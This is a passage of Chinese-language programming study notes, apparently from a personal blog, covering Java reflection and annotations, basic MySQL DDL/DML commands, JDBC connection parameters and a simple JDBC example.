title="class的获取Field方法"></a>class的获取Field方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>field[] getFields() 获取所有Public修饰的成员变量</span><br><span class="line"><span class="number">2.</span> <span class="function">field <span class="title">getField</span><span class="params">(string name)</span> 获取其中一个field</span></span><br><span class="line"><span class="function">3.field[] <span class="title">getDeclaredFields</span><span class="params">()</span> 获取所有的成员变量，不考虑修饰符  包括Public</span></span><br><span class="line"><span class="function">4.field <span class="title">getDeclaredField</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function"><span class="comment">//私有的不能直接访问  需要忽略访问权限修饰的安全检查</span></span></span><br><span class="line"><span class="function">a.<span class="title">setAccessible</span><span class="params">(<span class="keyword">true</span>)</span><span class="comment">//暴力反射  a是一个类的属性字段</span></span></span><br><span class="line"><span class="function"><span class="comment">//带declared  需要通过setAccessible(true) 暴力反射</span></span></span><br><span class="line"><span class="function">获取值 get</span></span><br><span class="line"><span class="function">设置值 set</span></span><br></pre></td></tr></table></figure><h4 id="class的获取Constructor方法"><a href="#class的获取Constructor方法" class="headerlink" title="class的获取Constructor方法"></a>class的获取Constructor方法</h4><blockquote><p>获取构造方法门</p><p>Constructor getConstructors(…paramterTypes)</p><p>得到构造器后可以用她创建对象</p><p>construct.newInstance()</p><p>class.newInstance()</p></blockquote><h4 id="class的获取Methods的方法"><a href="#class的获取Methods的方法" class="headerlink" title="class的获取Methods的方法"></a>class的获取Methods的方法</h4><blockquote><p>获取Method</p><p>Method obj=personClass.getMethod(“eat” )</p><p>执行方法    .invoke()</p><p>Person p =new Person()</p><p>obj.invoke(p)</p><p>获取方法名</p><p>.getName()</p></blockquote><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><blockquote><p>写一个框架类，不能改变该类的任何代码的前提下，可以帮我们创建任意类的对象，并且执行    其中任意方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.go.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/14 - 17:10</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">//实现</span></span><br><span class="line"><span class="comment">//    1.配置文件</span></span><br><span class="line"><span class="comment">//    2.反射</span></span><br><span class="line"><span class="comment">//    步骤</span></span><br><span class="line"><span class="comment">//    将需要创建的对象的全类名和需要执行的方法定义在配置文件中</span></span><br><span class="line"><span class="comment">//    在程序中加载读取配置文件</span></span><br><span class="line"><span class="comment">//    使用反射技术来加载类文件进内存</span></span><br><span class="line"><span class="comment">//    创建对象</span></span><br><span class="line"><span class="comment">//    执行方法</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line"><span class="comment">//        1.加载配置文件</span></span><br><span class="line">        Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line"><span class="comment">//        2.获取class目录下的配置文件</span></span><br><span class="line"><span class="comment">//        loader 类加载器</span></span><br><span class="line">        ClassLoader loader=ReflectTest.class.getClassLoader();</span><br><span class="line"><span class="comment">//        3.获取字节流</span></span><br><span class="line">        InputStream is=loader.getResourceAsStream(<span class="string">&quot;pro.properties&quot;</span>);</span><br><span class="line"><span class="comment">//        4.调用加载</span></span><br><span class="line">        pro.load(is);</span><br><span class="line"><span class="comment">//        5.获取配置文件中的数据</span></span><br><span class="line">        String className=pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        String methodName=pro.getProperty(<span class="string">&quot;methodsName&quot;</span>);</span><br><span class="line"><span class="comment">//        6.加载该类进内存</span></span><br><span class="line">        Class cls=Class.forName(className);</span><br><span class="line"><span class="comment">//        7.创建对象</span></span><br><span class="line">        Object obj=cls.newInstance();</span><br><span class="line"><span class="comment">//        8.获取方法对象</span></span><br><span class="line">        Method meth=cls.getMethod(methodName);</span><br><span class="line"><span class="comment">//        9.执行方法</span></span><br><span class="line">        meth.invoke(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><blockquote><p>Annotation </p><p>使用注解   @注解名称</p><p>1.编译检查  @override  检查该方法是否重写了父类的方法</p><p>2.编写文档    javadoc 命令</p><p>3.代码分析   使用反射</p></blockquote><h4 id="jdk内置注解"><a href="#jdk内置注解" class="headerlink" title="jdk内置注解"></a>jdk内置注解</h4><blockquote><p>@override</p><p>@oeprecated    表示已过时</p><p>@SuppressWarnings:   压制警告</p><p>@SuppressWarnings(“all”) 一般放在类上</p></blockquote><h4 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h4><blockquote><p>格式：</p><ol><li>元注解</li><li>public @interface 注解名称{}</li></ol><p>public interface MyAnno extends Java.lang.annotation.Annotation{}</p><p>注解本质上就是一个接口，该接口默认继承</p><p>属性：接口中的抽象方法</p><p>属性的返回值有下列取值：</p><ol><li>基本数据类型</li><li>string</li><li>枚举</li><li>注解</li><li>以上类型的数组</li></ol><p>定义了属性，在使用时需要给属性赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">show1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">show2</span><span class="params">()</span> <span class="keyword">default</span> &quot;lisi&quot;</span>;</span><br><span class="line">    <span class="function">Person <span class="title">per</span><span class="params">()</span></span>;  <span class="comment">//Person  为枚举类型</span></span><br><span class="line">    <span class="function">MyAnno <span class="title">anno2</span><span class="params">()</span></span>;<span class="comment">//MyAnno  注解</span></span><br><span class="line">    String[] show3();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@MyAnno(show1&#x3D;1,show2&#x3D;&quot;zhangsan&quot;)</span><br><span class="line">public class Worker &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;其他同理</span><br></pre></td></tr></table></figure><p>若定义了default  则调用时可以不赋值</p><p>数组赋值时，用{}包裹</p></blockquote><h5 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h5><blockquote><p>@Target:描述能够作用的位置</p><p>@Retention:描述注解被保留的阶段</p><p>@Documented:描述注解是否被抽取到api文档中</p><p>@Inherited:描述注解是否被子类继承 子类自动继承</p></blockquote><h4 id="注解的使用"><a href="#注解的使用" class="headerlink" title="注解的使用"></a>注解的使用</h4><p>在程序中使用（解析）注解：获取注解中定义的属性值</p><blockquote><p>使用注解可以来代替配置文件</p><p>步骤：</p><ol><li>获取注解定义的位置的对象（class,method,field)</li><li>获取指定的的注解 getAnnotation(class)</li><li>调用注解中的抽象方法获取配置的属性值</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Pro(className=&quot;cn.itcast.anno.demo&quot;,methodName=&quot;show&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnoTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class test=AnnoTest.class;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取注解对象</span></span><br><span class="line">        Pro an=test.getAnnotation(pro.class);</span><br><span class="line">        </span><br><span class="line">        String className=an.className;</span><br><span class="line">        String methodName=an.methodName;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        System.out.println(methodName);</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="简单测试的框架"><a href="#简单测试的框架" class="headerlink" title="简单测试的框架"></a>简单测试的框架</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.go.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.go.clac.clac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/14 - 19:45</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Check</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        1.创建计算器对象</span></span><br><span class="line">        clac c=<span class="keyword">new</span> clac();</span><br><span class="line"><span class="comment">//        2.创建字节码文件对象</span></span><br><span class="line">        Class cls=c.getClass();</span><br><span class="line"><span class="comment">//        3.获取该类所有的方法</span></span><br><span class="line">        Method[] methods=cls.getMethods();</span><br><span class="line">        <span class="keyword">int</span> number=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="keyword">if</span>(method.isAnnotationPresent((Check.class)))&#123; <span class="comment">//判断是否有check注解</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    method.invoke(c);<span class="comment">//执行方法</span></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"><span class="comment">//                    捕获异常</span></span><br><span class="line">                    number ++;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h2><blockquote><p>net start mysql</p><p>net stop mysql</p></blockquote><h3 id="mySql登录"><a href="#mySql登录" class="headerlink" title="mySql登录"></a>mySql登录</h3><blockquote><p>mysql -u root -p root </p><p>mysql -ip -u root -p 密码 </p><p>mysql –host=ip –user=root –password=root</p></blockquote><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><blockquote><p>结构化查询语言</p><p>操作所有的关系型数据库的规则</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;show databases  查看有哪些数据库</span><br></pre></td></tr></table></figure><blockquote><p>sql 语句以分号结尾</p><p>三种注释</p><p>*单行注释  –注释内容 或者 #内容</p><p><em>多行注释   /</em> *  注释内容    */</p><p>DDL(操作数据库、表)</p><p>DQL(查询表中的数据)</p><p>DML(增删改表中的数据)</p><p>DCL(授权)‘</p><p>show create database 数据库名称 </p><p>//查询某个数据库的字符集</p></blockquote><h4 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;创建数据库</span><br><span class="line">create database db1;</span><br><span class="line">&#x2F;&#x2F;加条件判断</span><br><span class="line">create database if not exists db1;</span><br><span class="line">&#x2F;&#x2F;创建数据库时指定字符集</span><br><span class="line">create database db3 character set gbk;</span><br><span class="line">&#x2F;&#x2F;同时写</span><br><span class="line">cteate databse  if not exists db2 character set gbk;</span><br><span class="line">&#x2F;&#x2F;修改数据库的字符集</span><br><span class="line">alter database db3 character set utf8;</span><br><span class="line">&#x2F;&#x2F;删除数据库</span><br><span class="line">drop database db3;</span><br><span class="line">&#x2F;&#x2F;加入判断</span><br><span class="line">drop database if exists db3;</span><br><span class="line">&#x2F;&#x2F;查询当前正在使用的数据库</span><br><span class="line">select database()</span><br><span class="line">&#x2F;&#x2F;使用数据库</span><br><span class="line">use db1;</span><br></pre></td></tr></table></figure><h4 id="操作表"><a href="#操作表" class="headerlink" title="操作表"></a>操作表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询数据库中所有表的名称</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询表结构</span><br><span class="line"><span class="keyword">desc</span> 表名</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>创建表  最后一列不需要逗号</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">列名<span class="number">1</span> 数据类型<span class="number">1</span>；</span><br><span class="line">列名<span class="number">2</span> 数据类型<span class="number">2</span>；</span><br><span class="line">...</span><br><span class="line">)；   </span><br><span class="line"><span class="keyword">double</span>(<span class="number">5</span>,<span class="number">2</span>) 小数点最后最大<span class="number">5</span>位，保留两位</span><br><span class="line"><span class="type">timestamp</span> 时间戳类型 若没赋值，则默认使用当前系统时间</span><br><span class="line"><span class="type">varchar</span>(<span class="number">20</span>) 指定最大字符长度</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>删除表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> 表名</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>复制表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> stu <span class="keyword">like</span> student; </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu rename <span class="keyword">to</span> student;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>修改表的字符集</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="type">character</span> <span class="keyword">set</span> 字符集名称;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>添加一列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span>  列名 数据类型</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>修改列名称 类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 change 列名 新列名 新数据类型；</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify 列名 新数据类型;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>删除列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> 列名;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="操作表中的数据"><a href="#操作表中的数据" class="headerlink" title="操作表中的数据"></a>操作表中的数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>添加数据</span><br><span class="line"><span class="keyword">insert</span>  <span class="type">int</span> 表名 (列名<span class="number">1</span>，列名<span class="number">2.</span>..) <span class="keyword">values</span> (value1,value2...)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>删除数据</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件</span><br><span class="line">若没加条件则删除所有数据 不推荐使用</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>删除表，在创建一个一摸一样的空表  类似于删除表中所有数据</span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> stu;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>修改数据</span><br><span class="line">update 表名 <span class="keyword">set</span> 列名<span class="number">1</span><span class="operator">=</span>value1,列名<span class="number">2</span><span class="operator">=</span>value2 <span class="keyword">where</span> 条件</span><br><span class="line">如果不加条件，则修改表中所有的数据</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询表中记录的格式</span><br><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> 表名列表</span><br><span class="line"><span class="keyword">where</span> 条件列表</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> 分组字段</span><br><span class="line"><span class="keyword">having</span> 分组之后的条件</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 排序字段</span><br><span class="line">limit 分页限定</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>去重 <span class="keyword">distinct</span></span><br><span class="line">如果有<span class="keyword">Null</span>参与的计算，结果都是<span class="keyword">null</span></span><br><span class="line"><span class="keyword">select</span> name,chinese,math,IFNULL(chinese,<span class="number">0</span>)<span class="operator">+</span>IFNULL(math,<span class="number">0</span>) <span class="keyword">as</span> 别名 <span class="keyword">from</span> student</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>通过IFNULL(字段,默认值) 可以设置计算时的默认值</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参数信息"><a href="#参数信息" class="headerlink" title="参数信息"></a>参数信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">参数名称                    参数说明                                                                                                                         缺省值     最低版本要求</span><br><span class="line">user                      数据库用户名（用于连接数据库）                                                                                                                  所有版本</span><br><span class="line">password                   用户密码（用于连接数据库）                                                                                                                     所有版本</span><br><span class="line">useUnicode              是否使用Unicode字符集，如果参数characterEncoding设置为gb2312或gbk，本参数值必须设置为true                                                   false     1.1g</span><br><span class="line">characterEncoding       当useUnicode设置为true时，指定字符编码。比如可设置为gb2312或gbk                                                                           false     1.1g</span><br><span class="line">autoReconnect                当数据库连接异常中断时，是否自动重新连接？                                                                                           false     1.1</span><br><span class="line">autoReconnectForPools     是否使用针对数据库连接池的重连策略                                                                                                     false     3.1.3</span><br><span class="line">failOverReadOnly         自动重连成功后，连接是否设置为只读？                                                                                                    true     3.0.12</span><br><span class="line">maxReconnects           autoReconnect设置为true时，重试连接的次数                                                                                                 3     1.1</span><br><span class="line">initialTimeout        autoReconnect设置为true时，两次重连之间的时间间隔，单位：秒                                                                                    2     1.1</span><br><span class="line">connectTimeout       和数据库服务器建立socket连接时的超时，单位：毫秒。 0表示永不超时，适用于JDK 1.4及更高版本                                                            0     3.0.1</span><br><span class="line">socketTimeout          socket操作（读写）超时，单位：毫秒。 0表示永不超时                                                                                            0     3.0.1</span><br></pre></td></tr></table></figure><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><blockquote><p>Java dataBase Connectivity  java 数据库连接</p><p>Jdbc本质：定义了操作所有关系型数据库的规则 定义了一套接口</p><p>实现类：数据库驱动</p></blockquote><p>步骤</p><blockquote><p>1.导入驱动Jar包</p><p>2.注册驱动</p><p>3.获取数据库连接对象 Connection</p><p>4.定义 sql</p><p>5.获取执行sql语句的对象 statement</p><p>6.执行sql，接受返回的结果</p><p>7.处理结果</p><p>8.释放资源</p></blockquote><h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.Driver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/15 - 17:10</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Javadbcon</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line"><span class="comment">//        注册驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="comment">//        获取数据库连接对象</span></span><br><span class="line">        Connection con=DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/db1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="comment">//        定义sql语句</span></span><br><span class="line">        String  sql=<span class="string">&quot;update test set age=100 where id=1&quot;</span>;</span><br><span class="line"><span class="comment">//        获取执行sql的对象    Statement</span></span><br><span class="line">        Statement statement=con.createStatement();</span><br><span class="line"><span class="comment">//        执行sql方法</span></span><br><span class="line">        <span class="keyword">int</span> count=statement.executeUpdate(sql);</span><br><span class="line">        System.out.println(count);</span><br><span class="line"><span class="comment">//        释放资源</span></span><br><span class="line">        con.close();</span><br><span class="line">        statement.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="详解操作对象"><a href="#详解操作对象" class="headerlink" title="详解操作对象"></a>详解操作对象</h3><h4 id="1-DriverManager"><a href="#1-DriverManager" class="headerlink" title="1.DriverManager"></a>1.DriverManager</h4><blockquote><p>驱动管理对象</p><p>功能：</p><ol><li>注册驱动  告诉程序该使用哪一个数据库驱动jar</li><li>通过 Class.forName(“com.mysql.jdbc.Driver”)</li><li>mysql5之后的驱动jar包可以省略  因为jar包里已经配置了</li><li>获取数据库连接</li><li>getConnection(String url,String user,String password)</li><li>url:指定连接的路径   语法 ：jdbc:mysql://ip地址(域名):端口号/数据库名称</li></ol></blockquote><h4 id="2-Connection"><a href="#2-Connection" class="headerlink" title="2.Connection"></a>2.Connection</h4><blockquote><p>数据库连接对象</p><p>1.获取执行sql的对象</p><p>Statement createStatement() </p><p>2.管理事务</p><ol><li>开启事务  setAutoCommit(boolean autoCommit) 设置参数位false </li><li>提交事务 commit()</li><li>回滚事务 rollback()</li></ol></blockquote><h4 id="3-Statement"><a href="#3-Statement" class="headerlink" title="3.Statement"></a>3.Statement</h4><blockquote><p>执行sql的对象   </p><p>执行静态sql  参数给定值</p><ol><li><p>execute(sql) 可以执行任何sql</p></li><li><p>executeUpdate(sql) 可以执行dml(curd)语句  ddl语句(create 表 ,alter,drop)很少</p><p>返回值：返回的是影响的行数，可以通过返回值判断是否执行成功</p></li><li><p>executeQuery(sql) 查询查询语句  </p><p>返回值：结果集对象</p></li><li><p>释放资源应该放在finnally</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(statement!=<span class="keyword">null</span>)&#123;</span><br><span class="line">statement.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(con!=<span class="keyword">null</span>)&#123;</span><br><span class="line">con.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><p>4.ResultSet</p><blockquote><p>结果集对象</p><p>封装查询结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//游标向下移动一行</span></span><br><span class="line">next()</span><br><span class="line"><span class="comment">//获取数据</span></span><br><span class="line">getInt(参数)</span><br><span class="line">    <span class="number">1.</span><span class="keyword">int</span> 代表列的编号 从<span class="number">1</span>开始</span><br><span class="line">    <span class="number">2.</span>string 列的名称 </span><br><span class="line">getString(参数)</span><br><span class="line">   同理</span><br></pre></td></tr></table></figure><p>方法的返回值是 ResultSet</p><figure class="highlight java"><table><tr><td 